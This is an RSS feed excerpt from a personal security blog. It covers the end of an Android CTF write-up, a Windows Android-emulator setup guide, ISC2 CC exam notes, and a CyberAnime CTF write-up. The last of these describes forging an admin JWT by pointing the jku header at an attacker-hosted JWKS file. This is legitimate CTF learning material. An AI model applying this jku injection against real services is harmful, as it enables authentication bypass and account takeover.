&lt;ul&gt;
&lt;li&gt;&lt;code&gt;onNewIntent&lt;/code&gt; is called (because of &lt;code&gt;FLAG_ACTIVITY_SINGLE_TOP&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;action&lt;/code&gt; is &lt;code&gt;&quot;REOPEN&quot;&lt;/code&gt;, so &lt;code&gt;this.f.addTag(&quot;REOPEN&quot;)&lt;/code&gt; is executed, and &lt;code&gt;success(this)&lt;/code&gt; is called.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;03-01 23:22:40.775  3685  3685 I Flag7   : success() called!
03-01 23:22:40.812  3685  3685 I Flag7   : HXT{xxxxxxxxx}

&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;So this is it for Part1, we managed to get the first 7 flag for the apk, which was all for the activity part. We will continue digging more in upcoming parts inshalah.
:::important
I left some references in the end which I find super usefull, some were already mentioned above, make sure to check them all!
:::&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Android Activity Lifecycle&lt;/strong&gt;&lt;br /&gt;
&lt;a href=&quot;https://medium.com/@ranjeet123/android-activity-lifecycle-in-detail-eaf2931a1b37&quot;&gt;https://medium.com/@ranjeet123/android-activity-lifecycle-in-detail-eaf2931a1b37&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Sending Intent Inside Another Intent&lt;/strong&gt;&lt;br /&gt;
&lt;a href=&quot;https://stackoverflow.com/questions/13381535/sending-intent-inside-of-another-intent&quot;&gt;https://stackoverflow.com/questions/13381535/sending-intent-inside-of-another-intent&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Android Developer Documentation&lt;/strong&gt;&lt;br /&gt;
&lt;a href=&quot;https://developer.android.com/guide/components/activities/intro-activities&quot;&gt;https://developer.android.com/guide/components/activities/intro-activities&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Intent Redirection&lt;/strong&gt;&lt;br /&gt;
&lt;a href=&quot;https://medium.com/@0x3adly/android-intent-redirection-a-hackers-gateway-to-internal-components-ebe126bbb2e0&quot;&gt;https://medium.com/@0x3adly/android-intent-redirection-a-hackers-gateway-to-internal-components-ebe126bbb2e0&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;pwny.cc&lt;/strong&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.pwny.cc/so/android/intent&quot;&gt;https://www.pwny.cc/so/android/intent&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
</content:encoded></item><item><title>Newbie Android Emulator Setup</title><link>https://ymuuuu.github.io/posts/android_emulator_setup/</link><guid isPermaLink="true">https://ymuuuu.github.io/posts/android_emulator_setup/</guid><description>Android Emulator Setup for Windows Without Android Studio IDE.</description><pubDate>Tue, 17 Dec 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )&lt;/h1&gt;
&lt;p&gt;:::caution
#FreePalastine
:::&lt;/p&gt;
&lt;h2&gt;Intro&lt;/h2&gt;
&lt;p&gt;Recently, I&apos;ve been exploring Android hacking and testing. While it&apos;s been quite enjoyable, I&apos;ve faced challenges with setting up the environment—specifically with emulators.&lt;/p&gt;
&lt;p&gt;I&apos;ve experimented with several emulators, and here&apos;s my honest feedback:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Genymotion → extremely buggy&lt;/li&gt;
&lt;li&gt;NOX → reminiscent of Bluestacks (if you know what I mean)&lt;/li&gt;
&lt;li&gt;VM with x86 Image → lacks user-friendliness&lt;/li&gt;
&lt;li&gt;Android Studio → requires excessive computing power&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Issue and Resolution&lt;/h2&gt;
&lt;p&gt;While each emulator has its share of bugs and issues, Android Studio proved to be the most reliable. However, the main drawback was needing to launch the entire IDE just to run the emulator. I wondered if there was a way to run the Android Emulator (Android Device Manager) without launching the full IDE and consuming unnecessary resources. After seeing this capability on Linux and MacOS, I decided to explore the possibility for Windows.&lt;/p&gt;
&lt;p&gt;This is exactly what I&apos;ll guide you through today.&lt;/p&gt;
&lt;h2&gt;Why Android Studio?&lt;/h2&gt;
&lt;p&gt;It&apos;s the most comprehensive emulator available for penetration testing needs. It offers numerous APIs and diverse image types, including both rooted and non-rooted versions, with or without GApps, and supports various mobile screen sizes.&lt;/p&gt;
&lt;h2&gt;Steps&lt;/h2&gt;
&lt;p&gt;:::important
If you already have Android Studio installed, please skip to the IMPORTANT PART
:::&lt;/p&gt;
&lt;p&gt;First, we need to install Android Studio → &lt;a href=&quot;https://developer.android.com/studio&quot;&gt;LINK&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;After installation, open Android Studio and navigate to the Device Manager&lt;/p&gt;
&lt;p&gt;Find it in the top-left menu: Tools → Device Manager&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;As you can see, I&apos;ve set up several devices, mostly Nexus 6. Why? This device offers root options with minimal issues, though without GApps. For CTFs, you won&apos;t really need GApps, but for real penetration testing scenarios, you definitely will.&lt;/p&gt;
&lt;p&gt;Now click the Plus Icon and select &quot;Create Virtual Machine&quot;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image%201.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;here type nexus 6 and click next&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image%202.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Here you&apos;ll see a variety of options to choose from. Select whichever API you want to test on, including AOSP and GApps&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image%203.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;After downloading and selecting your preferred option, click Next&lt;/p&gt;
&lt;h2&gt;IMPORTANT PART&lt;/h2&gt;
&lt;p&gt;Here comes an important part: When selecting the name, avoid using any spaces to make it easier to use later. Make sure to copy this name.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image%204.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Next, scroll down and uncheck &quot;Enable device frame&quot;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image%205.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;If you click on Advanced Settings, you&apos;ll see the system hardware configuration. If you&apos;re not familiar with these settings, it&apos;s best to leave them as they are. Click Finish when you&apos;re done.&lt;/p&gt;
&lt;p&gt;Now that you have your emulator set up, note that the AVD manager is &lt;strong&gt;MOSTLY&lt;/strong&gt; installed in this directory&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\%USERPROFILE%\AppData\Local\Android\Sdk\emulator\
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To run the emulator, use:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\%USERPROFILE%\AppData\Local\Android\Sdk\emulator\emulator
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To launch a specific emulator in PowerShell (without quotes), use:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\Users\%USERPROFILE%\AppData\Local\Android\Sdk\emulator\emulator -avd &quot;nameofAVD&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Simply enter this command in a PowerShell terminal to start the emulator without running Android Studio.&lt;/p&gt;
&lt;p&gt;For convenience, you can save these commands for different APIs in a &lt;code&gt;.bat&lt;/code&gt; file like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;image%206.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;:::warning
Happy APK Hacking
:::&lt;/p&gt;
</content:encoded></item><item><title>ISC2 CC Exam Notes</title><link>https://ymuuuu.github.io/posts/isc2_cc_notes/</link><guid isPermaLink="true">https://ymuuuu.github.io/posts/isc2_cc_notes/</guid><description>Certified in Cybersecurity Exam Notes made by a noob guy.</description><pubDate>Sun, 08 Dec 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )&lt;/h1&gt;
&lt;p&gt;:::caution
#FreePalastine
:::&lt;/p&gt;
&lt;h2&gt;Exam Review&lt;/h2&gt;
&lt;p&gt;The ISC2 CC exam is comprehensive, rich in content, and consists of multiple-choice questions. It is not as straightforward as some might claim; most questions require not just memorization but a deep understanding to identify the best choice among several options. The exam is designed to be tricky, so it is crucial to read each question carefully. I completed the exam in approximately 25 minutes.&lt;/p&gt;
&lt;p&gt;The exam took place at the AUC - Engineering Faculty Building. Candidates are not allowed to bring any personal belongings into the testing hall; these must be left in a locker provided outside. Inside the testing hall, other candidates may also be taking exams. An escort will guide you to your designated PC where you will begin your exam. The testing hall is closely monitored, so any attempts to circumvent the rules will be detected. If you need assistance during the exam, simply raise your hand, and a proctor will attend to you.&lt;/p&gt;
&lt;p&gt;Overall, the ISC2 CC exam is a rigorous assessment of your cybersecurity knowledge and skills. Success requires not only preparation but also careful attention to detail during the exam.&lt;/p&gt;
&lt;p&gt;:::note
The Ultimate Super Duper Notes
&lt;a href=&quot;https://www.notion.so/ISC2-CC-Exam-Notes-14f46f5c6df880619cf5c0aa4427fd92?pvs=21&quot;&gt;Click Here&lt;/a&gt;
:::&lt;/p&gt;
</content:encoded></item><item><title>CyberAnime Web Challenge Writeup</title><link>https://ymuuuu.github.io/posts/ctfs/cyberanimewriteup/</link><guid isPermaLink="true">https://ymuuuu.github.io/posts/ctfs/cyberanimewriteup/</guid><description>This writeup details the steps taken to solve the CyberAnime Web Challenge on Cybertalents.</description><pubDate>Sun, 07 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )&lt;/h1&gt;
&lt;p&gt;:::caution
#FreePalastine
:::&lt;/p&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;This writeup details the steps taken to solve the &lt;strong&gt;CyberAnime Web Challenge&lt;/strong&gt; on &lt;strong&gt;Cybertalents&lt;/strong&gt;. The challenge involves bypassing JWT authentication to gain access as an admin and retrieve the flag.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Step 1: Initial Reconnaissance&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Launch the Machine&lt;/strong&gt;: Start by launching the machine and accessing the provided URL.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Login Attempt&lt;/strong&gt;: Try logging in with common credentials like &lt;code&gt;admin:admin&lt;/code&gt;. This attempt fails, and there is nothing unusual in the source code.&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Step 2: Register an Account&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Register&lt;/strong&gt;: Register a new account using any credentials.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Inspect POST Request&lt;/strong&gt;: Use &lt;strong&gt;Burp Suite&lt;/strong&gt; to inspect the POST request sent during registration. The request redirects to &lt;code&gt;/home&lt;/code&gt;.
&lt;img src=&quot;https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kdlLVgsyYgiZRP0OCoHi3Q.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Step 3: Analyze Cookies&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;SessionToken Cookie&lt;/strong&gt;: Inspect the &lt;code&gt;SessionToken&lt;/code&gt; cookie using &lt;a href=&quot;https://jwt.io/&quot;&gt;jwt.io&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JWT Details&lt;/strong&gt;: The JWT uses the &lt;code&gt;RS256&lt;/code&gt; algorithm. The &lt;code&gt;kid&lt;/code&gt; (Key ID) is a random number, and the &lt;code&gt;jku&lt;/code&gt; (JSON Web Key Set URL) points to &lt;code&gt;/.well-known/jwks.json&lt;/code&gt;.
&lt;img src=&quot;https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gOV5n6myg2qAK6Z61YIs7A.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Step 4: Access the JWKS Endpoint&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;JWKS URL&lt;/strong&gt;: Access the JWKS URL:&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;http://wcamxwl32pue3e6m873od00swzy0jk31drmetrzm-web.cybertalentslabs.com/.well-known/jwks.json&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Key Retrieval&lt;/strong&gt;: Confirm that the server returns a valid key.
&lt;img src=&quot;https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UUZek7-S8hOznng266-GdQ.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Step 5: Exploit JWT Authentication via JKU Header Injection&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Objective&lt;/strong&gt;: Force the server to use a malicious JWKS URL to validate a forged JWT.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Steps&lt;/strong&gt;:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Generate a new RSA key pair using &lt;strong&gt;Burp Suite&apos;s JWT Editor&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Copy the public key in JWK format.&lt;/li&gt;
&lt;li&gt;Host the malicious JWKS file on a server (e.g., Burp Collaborator or Exploit Server).&lt;/li&gt;
&lt;li&gt;Replace the &lt;code&gt;jku&lt;/code&gt; parameter in the JWT header with the URL of the malicious JWKS file.&lt;/li&gt;
&lt;li&gt;Modify the &lt;code&gt;kid&lt;/code&gt; parameter in the JWT header to match the &lt;code&gt;kid&lt;/code&gt; of the malicious JWK.&lt;/li&gt;
&lt;li&gt;Change the &lt;code&gt;username&lt;/code&gt; in the JWT payload to &lt;code&gt;admin&lt;/code&gt;.
&lt;img src=&quot;https://miro.medium.com/v2/resize:fit:1180/format:webp/1*0e2_aZXX5nJMBZPjJxv1LA.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Step 6: Craft and Sign the Malicious JWT&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;JWK Format&lt;/strong&gt;:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;keys&quot;: [
    {
      &quot;kty&quot;: &quot;RSA&quot;,
      &quot;e&quot;: &quot;AQAB&quot;,
      &quot;kid&quot;: &quot;893d8f0b-061f-42c2-a4aa-5056e12b8ae7&quot;,
      &quot;n&quot;: &quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw&quot;
    }
  ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Sign the JWT: Use Burp Suite&apos;s JWT Editor to sign the JWT without modifying the header.&lt;/strong&gt;
&lt;img src=&quot;https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NtYGqp2yJvenKaf8lnjjdA.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
</content:encoded></item></channel></rss>